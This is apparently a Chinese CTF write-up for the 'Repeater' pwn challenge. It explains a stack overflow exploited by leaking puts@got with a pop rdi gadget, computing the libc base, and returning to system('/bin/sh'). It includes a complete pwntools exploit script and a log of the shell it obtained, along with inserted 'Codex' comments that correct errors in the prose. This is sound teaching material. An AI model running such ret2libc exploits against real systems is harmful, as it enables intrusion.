---
title: "Repeater"
published: 2026-10-24
description: "泄露 GOT 中的函数地址，计算 libc 基址并构造 ret2libc。"
tags: ["CTF", "Vidar-Team", "HGAME mini 2025", "Pwn", "ROP", "ret2libc"]
category: "CTF Writeup"
draft: false
lang: "zh_CN"
---

> 人类的本质是复读机 (+1)

## 漏洞分析
查看IDA分析出的伪代码
```c
ssize_t vuln()
{
  _BYTE buf[32]; // [rsp+0h] [rbp-20h] BYREF

  puts(s: "In last task, I was hacked by t0hka.");
  puts(s: "And turns me into a repeater.");
  puts(s: "Now I will repeat what you say.");
  puts(s: "By the way, I removed the system function this time.");
  read(fd: 0, buf, nbytes: 0x60u);
  return write(fd: 1, buf, n: 0x60u);
}
```

可以看到我们这里并没有直接可利用的system函数和sh字符串，然而这道题目给了我们远端使用的libc，而libc中恰好提供了system函数和sh地址字符串。然而在AMD64 Linux平台下，由于存在ASLR机制，libc在程序中实际的地址是具有随机性的，所以我们需要想办法获取libc的地址，这样就能利用栈溢出控制返回地址执行system("/bin/sh")。

我们知道，对于动态链接的程序，通常通过 PLT（过程链接表） 和 GOT（全局偏移表） 实现对外部函数的调用。其中，PLT 负责跳转，GOT 负责保存外部函数的实际地址。当程序第一次调用某个外部函数时，如果采用延迟绑定机制，动态链接器会解析该函数的真实地址，并将其写入对应的 GOT 表项。此后再次调用该函数时，便可以通过 PLT 和 GOT 直接跳转到目标函数。也就是说，GOT表中puts的位置存储了真正的puts函数的位置，可以类比成函数指针一样的东西。

因此，我们可以通过pwntools获取puts@got的位置，然后诱导write函数输出puts@got地址存储的真正的puts的值，由于我们已经有了libc原件，可以直接用pwntools读取其中puts相对于libc基址的偏移量，这样只需要将泄露的puts的实际地址减去偏移量，就能得到真正的libc的加载的地址，从而加上system函数的偏移量以得到system的实际地址。

（Codex: 后面的 exp 实际用 puts 泄露 GOT 内容，并没有调用 write 读取 GOT；两者的参数设置和输出方式不同。）

不过，由于每次libc加载基址都会变，所以这个地址不可复用，然而，这个程序只进行了一次输入输出。因此，我们在诱导泄露Libc之后，可以再放vuln函数的地址，重新进行一次输入输出，并在第二次诱导程序执行system。

（Codex: ASLR 通常是在进程启动时选定基址；同一进程中再次进入 vuln 不会重新随机化，因此第一次泄露的地址可以继续用。）

## 漏洞利用
要想要让程序输出地址，我们需要手动调用puts@plt（这里就是最初puts的调用地址，经过GOT映射后得到真实的地址，所以只需要用puts@plt的地址就好了，可以直接用pwntools读取可执行文件），然后把我们需要打印的puts@got的内容作为rdi首个参数传给puts。因此，我们希望能有一个类似`pop rdi; ret`的gadget。

（Codex: 传给 rdi 的是 GOT 表项的地址，不是表项里保存的函数地址；puts 再从该地址读取并输出字节。）

```zsh
❯ ROPgadget --binary ./vuln | grep "rdi"
0x0000000000401106 : or dword ptr [rdi + 0x404048], edi ; jmp rax
0x0000000000401178 : or ebp, dword ptr [rdi] ; add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x00000000004012c3 : pop rdi ; ret
```
非常好，地址0x4012c3就是我们需要的gadget，构造的时候，我们把返回地址修改为gadget，然后后面加上puts@got的地址以作为`pop rdi`的目标，然后再执行puts@plt让程序输出。通常地址的输出会是6个字节。

由于puts会把输入当作字符串处理，所以如果地址前面六个字节存在\x00的话，输出就会被截断，我们当然可以想办法获取后面的内容，但是这里最简单的方法还是直接重新跑一次程序刷新地址，直到前面没有\x00。

（Codex: 重启不保证能消除空字节；`recvn(6)` 在泄露不足 6 字节时还可能混入后续提示。若用 write 定长泄露，就不受字符串结束符影响。）

接着，等我们获取到了地址之后，我们就能直接推算出Libc加载基址，在第二次输入中，加上system偏移量，以及libc中字符串"/bin/sh“的偏移量，就能直接执行我们所需要的getshell函数。

## exp
考虑到栈对齐，在payload中添加了一个ret来对齐。
```python
from pwn import *
context.binary = elf = ELF("./vuln")
libc = ELF("./libc-2.31.so")
p = remote("HOST_REDACTED", 0)
payload = b"A"*40 + p64(0x4012c3) + p64(elf.got["puts"]) + p64(elf.plt["puts"]) + p64(0x401196)
p.sendafter(b"time.\n", payload)
p.recvn(96)
leakPuts = u64(p.recvn(6).ljust(8, b"\x00"))
print("泄露的Puts地址可能为", hex(leakPuts))
libc.address = leakPuts - libc.sym["puts"]
payload = b"A" * 40 + p64(0x40101a) + p64(0x4012c3) + p64(next(libc.search(b"/bin/sh\x00"))) + p64(libc.sym['system'])
p.sendafter(b"time.\n", payload)
p.interactive()
```

运行结果是
```zsh
[+] Opening connection to HOST_REDACTED on port PORT_REDACTED: Done
泄露的Puts地址可能为 0x7f38fa0f3450
[*] Switching to interactive mode
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x1a\x10@\x00\x00\x00\x00\x00\xc3\x12@\x00\x00\x00\x00\x00\xbd5"\xfa8\x7f\x00\x00\xc0\x12\x0c\xfa8\x7f\x00\x00\xcb\x01\xe5\x7f\x8d\xfa7l\xb0\x10@\x00\x00\x00\x00\x00@b\x9f\x1b\xff\x7f\x00\x00$                          l                                                                                              ls                                                                                     ls
bin
dev
flag
ld-2.31.so
lib
lib32
lib64
libc-2.31.so
vuln
$ cat flag
[FLAG REDACTED]
```
